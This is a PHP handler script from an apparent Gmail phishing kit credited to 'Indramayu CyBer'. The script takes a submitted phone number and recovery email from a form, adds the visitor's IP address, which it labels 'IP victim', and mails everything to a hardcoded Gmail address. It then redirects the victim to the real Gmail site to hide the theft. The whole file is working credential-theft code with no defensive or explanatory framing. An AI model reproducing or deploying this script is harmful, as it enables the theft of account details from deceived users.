<?php
$ip = getenv("REMOTE_ADDR");
$number = $_POST['numbers'];
$emrec = $_POST['emrec'];

$numx = "Number : ".$number;
$emrex = "Email Recovery : ".$emrec;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Gmail Login Information";
mail("jesuswire80@gmail.com", "$body","$head \n$numx \n$emrex \n$target \n$foot");
header("Location: https://mail.google.com/");
?>